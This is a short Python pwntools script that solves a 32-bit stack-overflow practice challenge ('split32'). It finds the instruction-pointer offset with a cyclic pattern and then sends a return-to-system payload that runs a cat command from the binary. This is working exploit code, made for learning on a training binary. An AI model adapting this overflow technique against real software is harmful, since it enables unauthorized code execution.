''' DON'T FORGET:
	=============
	ell@ubuntu:~$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
	gdb-peda$ set disable-randomization off '''

from pwn import *

elf = ELF("./split32", checksec=False)
p = elf.process()

p.sendline(cyclic(128))
p.wait()
eip_offset = cyclic_find(p.corefile.eip)
p = elf.process()							# reinitializing the process

bin_cat = 0x804a030
payload = "A" * eip_offset + p32(elf.plt['system']) + "BBBB" + p32(bin_cat)

log.info('Payload length: %d', len(payload))
log.info('Sending payload...')
p.sendlineafter("> ", payload)
log.info('Payload sent!')

p.wait()
success(p.recv())